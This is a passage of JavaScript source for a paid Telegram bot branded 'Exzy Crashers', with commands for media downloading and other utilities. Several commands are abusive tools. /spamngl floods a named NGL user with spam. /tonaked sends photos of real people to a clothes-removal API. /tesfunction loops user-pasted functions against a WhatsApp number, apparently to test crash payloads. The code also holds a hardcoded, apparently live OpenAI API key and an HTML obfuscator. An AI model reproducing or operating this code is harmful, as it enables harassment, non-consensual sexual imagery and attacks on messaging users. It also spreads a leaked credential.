    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/yteamlowhh" }]
        ]
      }
    });
  }
  
    if (args.length < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Format: /spamngl yteamlowhh 10");
    }

    const username = args[0];
    const amount = parseInt(args[1], 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Masukkan jumlah dan harus berupa angka!");
    }

    await bot.sendMessage(chatId, `⏳ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");
        const message = "Who's ikky??";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          },
          body,
        });
      } catch (err) {
        console.error(`Error kirim ke-${i}:`, err.message);
      }

      if (i < amount) {
        if (i % 50 === 0) {
          await new Promise((r) => setTimeout(r, delay + 200));
        } else {
          await new Promise((r) => setTimeout(r, delay));
        }
      }
    }

    bot.sendMessage(chatId, `✅ ⵢ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    console.error("Error utama:", error);
    bot.sendMessage(chatId, "❌ ⵢ Gagal menghubungi API, coba lagi nanti.");
  }
});

// To Naked
bot.onText(/^\/tonaked(?:\s+(.+))?/,  async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1];
    let imageUrl = args || null;

    if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
      const fileId = msg.reply_to_message.photo.pop().file_id;
      const fileLink = await bot.getFileLink(fileId);
      imageUrl = fileLink;
    }

    if (!imageUrl) {
      return bot.sendMessage(chatId, "❌  Missing Input\nExample: /tonaked (reply gambar)");
    }

    const statusMsg = await bot.sendMessage(chatId, "⏳ Memproses gambar");

    try {
      const res = await fetch(
        `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
      );
      const data = await res.json();
      const hasil = data.result;

      if (!hasil) {
        return bot.editMessageText(
          "❌ ⵢ Gagal memproses gambar, pastikan URL atau foto valid",
          { chat_id: chatId, message_id: statusMsg.message_id }
        );
      }

      await bot.deleteMessage(chatId, statusMsg.message_id);
      await bot.sendPhoto(chatId, hasil);
    } catch (e) {
      await bot.editMessageText("❌ ⵢ Terjadi kesalahan saat memproses gambar", {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
    }
  });

// Test Function
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
bot.onText(/\/tesfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
const replyToMsg = msg.reply_to_message;

  // Validasi format argumen
  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, '🪧 ☇ Format: /TesFunc 62××× 10 (reply function)');
  }

  const q = match[1];
  const jumlah = parseInt(match[2]);
  if (isNaN(jumlah) || jumlah <= 0 || jumlah > 1000) {
    return bot.sendMessage(chatId, '❌ ☇ Jumlah harus angka antara 1-1000');
  }

  // Validasi reply
  if (!replyToMsg || !replyToMsg.text) {
    return bot.sendMessage(chatId, '❌ ☇ Reply dengan function');
  }

  const target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  const thumbnailUrl = 'https://files.catbox.moe/6kyeoi.jpg'; // ganti dengan URL real

  // Kirim pesan proses
  const processMsg = await bot.sendPhoto(chatId, thumbnailUrl, {
    caption: `<blockquote><pre>─━━─━━⧼ 𝗘𝗫𝗭𝗬 𝗖𝗥𝗔𝗦𝗛𝗘𝗥𝗦 ⧽─━━─━━</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: '⌜📱⌟ ☇ ターゲット', url: `https://wa.me/${q}` }]
      ]
    }
  });

  const processMessageId = processMsg.message_id;

  // Buat safe wrapper untuk sock (misalnya agar tidak crash)
  const createSafeSock = (sock) => sock; // atau implementasi sesuai kebutuhan
  const safeSock = createSafeSock(sock); // asumsi sock tersedia

  const funcCode = replyToMsg.text;
  const matchFunc = funcCode.match(/async function\s+(\w+)/);
  if (!matchFunc) {
    return bot.sendMessage(chatId, '❌ ☇ Function tidak valid');
  }
  const funcName = matchFunc[1];

  // Siapkan sandbox
  const sandbox = {
    console,
    Buffer,
    sock: safeSock,
    target,
    sleep, // fungsi sleep harus sudah didefinisikan
    generateWAMessageFromContent, // asumsi tersedia
    generateForwardMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    proto,
    jidDecode,
    areJidsSameUser
  };
  const context = vm.createContext(sandbox);

  const wrapper = `${funcCode}\n${funcName}`;
  let fn;
  try {
    fn = vm.runInContext(wrapper, context);
  } catch (err) {
    return bot.sendMessage(chatId, `❌ Error eksekusi function: ${err.message}`);
  }

  // Eksekusi looping
  for (let i = 0; i < jumlah; i++) {
    try {
      const arity = fn.length;
      if (arity === 1) {
        await fn(target);
      } else if (arity === 2) {
        await fn(safeSock, target);
      } else {
        await fn(safeSock, target, true);
      }
    } catch (err) {
      // silent
    }
    await sleep(200);
  }

  const finalText = `<blockquote><pre>─━━─━━⧼ 𝗘𝗫𝗭𝗬 𝗖𝗥𝗔𝗦𝗛𝗘𝗥𝗦 ⧽─━━─━━</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`;

  try {
    await bot.editMessageCaption(finalText, {
      chat_id: chatId,
      message_id: processMessageId,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '⌜📱⌟ ☇ ターゲット', url: `https://wa.me/${q}` }]
        ]
      }
    });
  } catch (err) {
    // Jika edit gagal, kirim pesan baru
    await bot.sendPhoto(chatId, thumbnailUrl, {
      caption: finalText,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '⌜📱⌟ ☇ ターゲット', url: `https://wa.me/${q}` }]
        ]
      }
    });
  }
});

const openaiKey = "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";
const openai = new OpenAI({ apiKey: openaiKey });
bot.onText(/^\/fixcode(.*)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userExplanation = match[1]?.trim() || "(no explanation provided)";

    // Pastikan reply ke pesan lain
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId,
        "❌ ⵢ Format : Reply Code With Command /fixcode"
      );
    }

    let code = "";
    let filename = "fixed.js";
    let lang = "JavaScript";

    const reply = msg.reply_to_message;

    if (reply.document) {
      const fileId = reply.document.file_id;
      const file = await bot.getFile(fileId);
      const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
      const response = await axios.get(fileLink);
      code = response.data;
      filename = reply.document.file_name || "fixed.js";

      if (filename.endsWith(".php")) lang = "PHP";
      else if (filename.endsWith(".py")) lang = "Python";
      else if (filename.endsWith(".html") || filename.endsWith(".htm")) lang = "HTML";
      else if (filename.endsWith(".css")) lang = "CSS";
      else if (filename.endsWith(".json")) lang = "JSON";
      else lang = "JavaScript";

    // === Jika reply text ===
    } else if (reply.text) {
      code = reply.text;
    } else {
      return bot.sendMessage(chatId, "❌ ⵢ Balas ke pesan teks atau file kode.");
    }

    await bot.sendMessage(chatId, "🛠️ ⵢ Process Check & Fix Code");

    const completion = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu hanya boleh memperbaiki error dalam kode dan merapikan format. " +
            "Berikan penjelasan error dan solusi, lalu tampilkan kode hasil perbaikan tanpa code block. " +
            "Format: ANALYSIS:[penjelasan] CODE:[kode hasil]"
        },
        {
          role: "user",
          content:
            userExplanation === "(no explanation provided)"
              ? `Perbaiki error dan rapikan format kode ${lang} ini:\n${code}`
              : `Perbaiki error dan rapikan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan:\n${userExplanation}`
        }
      ]
    });

    const result = completion.choices[0].message.content;

    // === Pisahkan ANALYSIS dan CODE ===
    const analysisMatch = result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i);
    const codeMatch = result.match(/CODE:\s*([\s\S]*?)$/i);
    const explanation = analysisMatch ? analysisMatch[1].trim() : "Tidak ada analisis spesifik.";
    const fixedCode = codeMatch ? codeMatch[1].trim() : result.trim();

    // === Kirim hasil analisis ===
    const header = `
<pre>¡ ᬊ 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ¡ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>
<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}
<b>Error Analysis:</b>
${explanation}

<b>© ⚊ yteamlowhh - ¿?</b>
`;

    await bot.sendMessage(chatId, header, { parse_mode: "HTML" });

    const tempDir = "./temp";
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const tempFilePath = `./temp/fixed_${Date.now()}_${filename}`;
    fs.writeFileSync(tempFilePath, fixedCode);

    await bot.sendDocument(chatId, tempFilePath, {}, {
      filename: `Fixed_${filename}`
    });

    fs.unlinkSync(tempFilePath);

    console.log(chalk.green(`✅ ⵢ Code fix completed for user ${senderId}`));

  } catch (error) {
    console.error(chalk.red(`❌ ⵢ Fixcode error: ${error.message}`));
    await bot.sendMessage(msg.chat.id,
      `❌ ⵢ Failed to fix code: ${error.message}\n\nPlease try again or contact support.`
    );
  }
});

bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;
    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await bot.sendSticker(chatId, res.data, { filename: "sticker.webp" });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    bot.sendMessage(chatId, "❌ ⵢ Gagal membuat stiker brat.");
  }
});

const iqcSessions = {};
bot.onText(/^\/ssiphone(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const args = msg.text.split(" ").slice(1);
    if (args.length < 3) {
      return bot.sendMessage(
        chatId,
        "❌ ⵢ Format : `/ssiphone 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      );
    }

    const time = args[0];
    const battery = args[1];
    const message = args.slice(2).join(" ");

    iqcSessions[chatId] = { time, battery, message };

    await bot.sendMessage(chatId, "Pilih Provider", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "Indosat", callback_data: "iqc_provider_Indosat" },
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("Failed /iqc:", err.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses IQC.");
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  try {
    if (!query.data.startsWith("iqc_provider_")) return;

    const provider = query.data.replace("iqc_provider_", "");
    const data = iqcSessions[chatId];

    if (!data) {
      return bot.sendMessage(chatId, "Data IQC tidak ditemukan. Jalankan command /iqc lagi.");
    }

    const { time, battery, message } = data;
    await bot.answerCallbackQuery(query.id, { text: "Diproses..." });
    await bot.sendMessage(chatId, "Sedang membuat gambar...");

    const apiUrl = `https://joocode.zone.id/api/iqc?t=${encodeURIComponent(
      time
    )}&b=${encodeURIComponent(battery)}&m=${encodeURIComponent(
      message
    )}&p=${encodeURIComponent(provider)}`;

    await bot.sendPhoto(chatId, apiUrl, {
      caption: "✅ ⵢ SsIphone By 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ( 🕷️ )",
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("ERROR callback_query:", err.message);
    bot.sendMessage(chatId, "Gagal generate IQC.");
  }
});

bot.onText(/^\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/yteamlowhh" }]
        ]
      }
    });
  }
  await bot.sendMessage(chatId, "Succes Restart Bot");
  setTimeout(() => process.exit(0), 1000);
});

bot.onText(/^\/tiktokdl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1]?.trim();

  if (!args)
    return bot.sendMessage(
      chatId,
      "❌ ⵢ Format: /tiktokdl https://example.com/"
    );

  let url = args;

  if (msg.entities) {
    for (const e of msg.entities) {
      if (e.type === "url") {
        url = msg.text.substring(e.offset, e.offset + e.length);
        break;
      }
    }
  }

  const wait = await bot.sendMessage(chatId, "Process Download Media Tiktok");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return bot.sendMessage(chatId, "❌ ⵢ Gagal ambil data video, pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = [];

      for (const img of imgs) {
        const res = await axios.get(img, { responseType: "arraybuffer" });
        media.push({
          type: "photo",
          media: { source: Buffer.from(res.data) }
        });
      }

      await bot.sendMediaGroup(chatId, media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await bot.sendVideo(
      chatId,
      Buffer.from(video.data),
      { supports_streaming: true },
      { filename: `${d.id || Date.now()}.mp4` }
    );
  } catch (e) {
    const errMsg = e?.response?.status
      ? `❌ ⵢ Error ${e.response.status} saat mengunduh video`
      : "❌ ⵢ Gagal mengunduh, koneksi lambat atau link salah";
    await bot.sendMessage(chatId, errMsg);
  } finally {
    try {
      await bot.deleteMessage(chatId, wait.message_id);
    } catch {}
  }
});

const sesi = {}

async function getTrack(query) {
  const url = `https://api.nekolabs.web.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`
  const res = await axios.get(url)
  return res.data.result
}

bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const query = match[1]

  if (!query) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /play judul lagu")
  }

  sesi[chatId] = {
    musicList: [],
    index: 0
  }

  try {
    const result = await getTrack(query)
    sesi[chatId].musicList.push(result)
    sendMusicCard(chatId)
  } catch {
    bot.sendMessage(chatId, "❌ ⵢ Lagu tidak ditemukan.")
  }
})

bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id
  const action = cb.data

  const session = sesi[chatId]
  if (!session || session.musicList.length === 0) {
  return bot.answerCallbackQuery(cb.id, { text: "‎ " })
  }

  const d = session.musicList[session.index]

  if (action === "music_play") {
    await bot.answerCallbackQuery(cb.id)
    return bot.sendAudio(chatId, d.downloadUrl, {
      title: d.metadata.title,
      performer: d.metadata.artist
    })
  }

  if (action === "music_lyrics") {
    await bot.answerCallbackQuery(cb.id)
    try {
      const lyr = await axios.get(
        `https://api.deline.web.id/tools/lyrics?title=${encodeURIComponent(d.metadata.title)}`
      )
      return bot.sendMessage(
        chatId,
        lyr.data.result?.[0]?.plainLyrics || "❌ ⵢ Lirik tidak ditemukan."
      )
    } catch {
      return bot.sendMessage(chatId, "❌ ⵢ Error mengambil lirik.")
    }
  }
})

function sendMusicCard(chatId) {
  const session = sesi[chatId]
  const d = session.musicList[session.index]
  const meta = d.metadata

  const caption = `🎵 Song Name *${meta.title}*
👤 Artist : ${meta.artist}
⏱ Duration : ${meta.duration}
`

  bot.sendPhoto(chatId, meta.cover, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎧 Play", callback_data: "music_play" }],
        [{ text: "🔤 Lyrics", callback_data: "music_lyrics" }]
      ]
    }
  })
}

bot.onText(/^\/instagramdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const q = match[1]

  if (!q) return bot.sendMessage(chatId, "❌ ⵢ Format: /instagramdl <url>")

  bot.sendMessage(chatId, "🕑 ⵢ Process Download media...")

  const api = `https://api.nekolabs.web.id/downloader/instagram?url=${encodeURIComponent(q)}`

  try {
    const r = await axios.get(api, { timeout: 15000 })
    if (!r.data || !r.data.success) return bot.sendMessage(chatId, "❌ ⵢ Gagal mengambil data")

    const list = r.data.result.downloadUrl

    if (!Array.isArray(list) || list.length === 0) return bot.sendMessage(chatId, "❌ ⵢ Media tidak ditemukan")

    for (const media of list) {
      if (media.endsWith(".mp4")) {
        await bot.sendVideo(chatId, media)
      } else {
        await bot.sendPhoto(chatId, media)
      }
    }

  } catch (e) {
    console.log("Err IG:", e.message)
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan, coba lagi")
  }
})

bot.onText(/^\/facebookdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const text = match[1]

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Format: /facebookdl <url>")

  const wait = await bot.sendMessage(chatId, "🕑 ⵢ Process Download Media...")

  try {
    const api = `https://api.nekolabs.web.id/downloader/facebook?url=${encodeURIComponent(text)}`
    const res = await axios.get(api)
    const result = res.data.result

    if (!result || !result.medias || result.medias.length === 0) {
      await bot.deleteMessage(chatId, wait.message_id)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada media ditemukan.")
    }

    for (const m of result.medias) {
      if (m.type === "image") {
        await bot.sendPhoto(chatId, m.url)
      } else if (m.type === "video") {
        await bot.sendVideo(chatId, m.url)
      }
    }

    await bot.deleteMessage(chatId, wait.message_id)
  } catch (e) {
    try { await bot.deleteMessage(chatId, wait.message_id) } catch {}
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan.")
  }
})

bot.onText(/^\/gconly(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/yteamlowhh" }]
        ]
      }
    });
  }
  const args = (match[1] || "").trim();
  if (!args || !/(on|off)/i.test(args)) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /gconly on | off");
  }
  const mode = args.toLowerCase();
  const status = mode === "on";
  setGroupOnly(status);
  bot.sendMessage(chatId, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/cekid$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const firstName = user.first_name || "";
  const lastName = user.last_name || "";
  const userId = user.id;
  try {
    const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
    const fileId = photos.photos[0][0].file_id;
    const text = `<b>User Info :</b>\n<b>USERNAME :</b> ${user.username ? '@' + user.username : 'Tidak ada'}\n<b>ID TELEGRAM:</b> <code>${userId}</code>`;
    bot.sendPhoto(chatId, fileId, {
      caption: text,
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: `${firstName} ${lastName}`, url: `tg://user?id=${userId}` }]
        ]
      }
    });
  } catch (e) {
    bot.sendMessage(chatId, `<b>ID :</b> <code>${userId}</code>`, { parse_mode: "HTML", reply_to_message_id: msg.message_id });
  }
});

bot.onText(/^\/pinterest(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match && match[1]) ? match[1].trim() : "";
  if (!query) return bot.sendMessage(chatId, "❌ ⵢ Format : /pinterest Butterfly");
  try {
    const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;
    const res = await axios.get(apiUrl, { timeout: 15000 });
    const data = res.data;
    if (!data || !data.result || data.result.length === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ No Pinterest images found for your query.");
    }
    await bot.sendPhoto(chatId, data.result[0], { caption: `📌 Pinterest Result for: *${query}*`, parse_mode: "Markdown" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Error fetching Pinterest image. Please try again later.");
  }
});


bot.onText(/^\/tofigure$/i, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  if (!reply || !reply.photo) return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Image With Caption /tofigure.");
  await bot.sendMessage(chatId, "🕑 ⵢ Process Tofigure");
  try {
    const photo = reply.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await bot.getFile(fileId);
    const telegramUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
    const apiUrl = `https://api.elrayyxml.web.id/api/ephoto/figure?url=${encodeURIComponent(telegramUrl)}`;
    const result = await axios.get(apiUrl, { responseType: "arraybuffer", timeout: 30000 });
    await bot.sendPhoto(chatId, Buffer.from(result.data), { caption: "✅ ⵢ Tofigure By 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ( 🍁 )" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan." + (e.message || ""));
  }
});

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ ⵢ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox..."); 

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    if (!catboxUrl.startsWith("https://")) {
      throw new Error("Catbox tidak mengembalikan URL yang valid");
    }

    await bot.editMessageText(`✅ ⵢ Tourl By 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ( 🕷️ )\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ ⵢ Gagal mengupload file ke Catbox");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const userId = msg.from.id;
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/yteamlowhh" }]
        ]
      }
    });
  }
  
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ ⵢ Format :  /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ ⵢ Get Code By 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ( 🕷️ ) ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "Error" + err);
  }
});

bot.onText(/\/enchtml(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from?.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Please Reply File .html");
  }

  try {
    const fileId = msg.reply_to_message.document.file_id;
    const fileInfo = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = global.Buffer.from(response.data).toString("utf8");

    const encoded = global.Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>mbape</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "encrypted.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await bot.sendDocument(chatId, outputPath, {
      caption: "✅ ⵢ Enc Html By 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ( 🕷️ )"
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ ⵢ Error Saat Membuat Sticker");
  }
});
})